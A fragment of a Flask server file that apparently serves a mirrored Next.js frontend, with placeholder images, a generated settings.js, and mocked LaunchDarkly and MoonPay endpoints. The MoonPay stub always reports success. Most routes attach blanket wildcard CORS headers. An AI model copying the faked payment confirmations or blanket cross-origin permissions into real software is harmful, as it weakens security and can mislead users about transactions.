                transparent_png = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
                with open(placeholder_path, 'wb') as f:
                    f.write(transparent_png)
                
                return send_from_directory(fallback_dir, 'placeholder.png')
        except Exception as e:
            logger.error(f"Error creating placeholder: {str(e)}")
        
        # Last resort - return a 1x1 transparent GIF
        response = Response(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', mimetype='image/gif')
        return response

    # Add a proxy for LaunchDarkly requests
    @app.route('/launchdarkly-proxy/<path:path>')
    def launchdarkly_proxy(path):
        """Proxy requests to LaunchDarkly API"""
        target_url = f"https://app.launchdarkly.com/{path}"
        logger.info(f"Proxying LaunchDarkly request: {target_url}")
        
        # Always return a mock success response to avoid LaunchDarkly errors
        mock_response = {
            "flags": {},
            "success": True
        }
        
        return Response(json.dumps(mock_response), mimetype="application/json")

    # Add specific route for settings.js
    @app.route('/static/settings.js')
    def serve_settings_js():
        logger.info("Serving settings.js with special headers")
        
        try:
            settings_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'static', 'settings.js')
            
            # Create a fallback settings.js if it doesn't exist
            if not os.path.exists(settings_path):
                with open(settings_path, 'w') as f:
                    f.write("""
// Auto-generated settings file
window.APP_CONFIG = {
    allowClipboard: true,
    preventDefaultClicks: true,
    enableProxies: true,
    debug: true
};
                    """)
                    
            with open(settings_path, 'r') as f:
                content = f.read()
                
            response = Response(content, mimetype='application/javascript')
            # Add extra permissive headers
            response.headers.update({
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': '*',
                'Cache-Control': 'no-cache'
            })
            return response
        except Exception as e:
            logger.error(f"Error serving settings.js: {str(e)}", exc_info=True)
            # Return a default settings.js content
            default_content = "window.APP_CONFIG = { allowClipboard: true, preventDefaultClicks: true, enableProxies: true };"
            return Response(default_content, mimetype='application/javascript')

    # Special handler for Next.js static files
    @app.route('/_next/static/<path:filename>')
    def serve_next_static_files(filename):
        logger.info(f"Special handler for Next.js static file: {filename}")
        
        parent_dir = os.path.dirname(os.path.abspath(__file__))
        next_static_dir = os.path.join(parent_dir, '..', '_next', 'static')
        
        if os.path.exists(os.path.join(next_static_dir, filename)):
            response = send_from_directory(next_static_dir, filename)
            # Add permissive headers
            response.headers.update({
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': '*',
                'Content-Type': 'application/javascript',
                'Cache-Control': 'public, max-age=31536000'  # Cache for a year to improve performance
            })
            return response
        
        # If not found, try a more flexible search
        for root, dirs, files in os.walk(next_static_dir):
            for file in files:
                if filename in file:
                    rel_path = os.path.relpath(os.path.join(root, file), next_static_dir)
                    dir_path = os.path.dirname(rel_path)
                    file_name = os.path.basename(rel_path)
                    
                    response = send_from_directory(os.path.join(next_static_dir, dir_path), file_name)
                    response.headers.update({
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
                        'Access-Control-Allow-Headers': '*',
                        'Content-Type': 'application/javascript'
                    })
                    return response
        
        # Not found anywhere
        return "JavaScript file not found", 404

    # Special handler for 037b440f directory
    @app.route('/static/037b440f/<path:filename>')
    def serve_037b440f_files(filename):
        logger.info(f"Special handler for 037b440f file: {filename}")
        
        parent_dir = os.path.dirname(os.path.abspath(__file__))
        static_dir = os.path.join(parent_dir, '..', 'static', '037b440f')
        
        if os.path.exists(os.path.join(static_dir, filename)):
            response = send_from_directory(static_dir, filename)
            
            # Set appropriate content type based on file extension
            if filename.endswith('.js'):
                response.headers['Content-Type'] = 'application/javascript'
            elif filename.endswith('.css'):
                response.headers['Content-Type'] = 'text/css'
            elif filename.endswith('.gif'):
                response.headers['Content-Type'] = 'image/gif'
                
            # Add permissive headers
            response.headers.update({
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'GET, OPTIONS',
                'Access-Control-Allow-Headers': '*',
                'Cache-Control': 'public, max-age=31536000'
            })
            return response
            
        # Try flexible search
        for root, dirs, files in os.walk(static_dir):
            for file in files:
                if filename in file:
                    response = send_from_directory(root, file)
                    # Add permissive headers
                    response.headers.update({
                        'Access-Control-Allow-Origin': '*',
                        'Access-Control-Allow-Methods': 'GET, OPTIONS',
                        'Access-Control-Allow-Headers': '*'
                    })
                    return response
                    
        return "File not found", 404

    # Add a route to handle MoonPay requests
    @app.route('/moonpay-proxy/<path:path>')
    def moonpay_proxy(path):
        """Mock MoonPay API responses"""
        logger.info(f"MoonPay request for: {path}")
        
        # Return a mock success response
        mock_response = {
            "success": True,
            "message": "MoonPay operation successful"
        }
        
        return Response(json.dumps(mock_response), mimetype="application/json")
        
    # Add special redirect for MoonPay scripts
    @app.route('/moonpay-sdk')
    def moonpay_sdk_redirect():
        """Provide a mock MoonPay SDK script"""
        mock_sdk = """
        // Mock MoonPay SDK
        window.MoonPayWebSdk = {
            init: function() {
                console.log('Mock MoonPay SDK initialized');
                return {
                    showWidget: function() { return Promise.resolve(); },
                    closeWidget: function() { return Promise.resolve(); }
                };
            }
        };
        // Trigger any queued callbacks
        if (window.__moonPaySdkCallback) {
            setTimeout(window.__moonPaySdkCallback, 0);
        }
        """
        
        return Response(mock_sdk, mimetype="application/javascript")
